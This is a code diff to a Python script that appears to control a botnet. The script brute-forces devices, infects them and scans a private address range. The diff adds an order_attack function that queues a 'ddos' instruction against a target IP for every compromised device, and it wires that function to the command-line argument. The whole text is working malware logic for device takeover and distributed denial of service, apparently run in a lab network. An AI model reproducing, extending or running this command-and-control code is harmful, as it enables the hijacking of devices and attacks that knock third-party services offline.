@@ -32,13 +32,12 @@ def main():
     brute_next_device()
     time.sleep(1) # ugly but works
     asyncio.run(infect_victims())
-    n_bruteforced = 0
     while True:
         if (brute_next_device() == -1):
             scan(False, "172.18.0.0", "28")
             continue;
-        n_bruteforced += 1
         asyncio.run(infect_victims())
+        # when you are satisfied with the number of infected victims just end the program.
 
 
 # this and the below function install programs have the purpose of
@@ -115,6 +114,25 @@ def give_instruction(instruction, device_id):
     con.commit()
     con.close()
 
+def order_attack(ip):
+    con = get_con()
+    rows = con.execute("""
+    SELECT device_id FROM DEVICES
+    """).fetchall()
+    instruction = f"ddos {ip}"
+    for (id,) in rows:
+        print(f"Ordering {id} to attack")
+        con.execute("""
+            INSERT INTO instructions (device_id, instruction, status)
+            VALUES (?, ?, ?)
+            ON CONFLICT(device_id)
+            DO UPDATE SET
+                instruction = excluded.instruction,
+                status = excluded.status
+        """,[id, instruction, 0])
+    con.commit()
+    con.close()
+
 # picks first device from db row and brutes it, marks as bruted and adds to devices
 def brute_next_device():
     print("Bruting next device\n")
@@ -188,6 +206,6 @@ async def infect_victims():
 
 if __name__ == "__main__":
     if len(sys.argv) > 1:
-        scan(False, "172.18.0.0", "28")
+        order_attack(sys.argv[1])
     else:
         main()
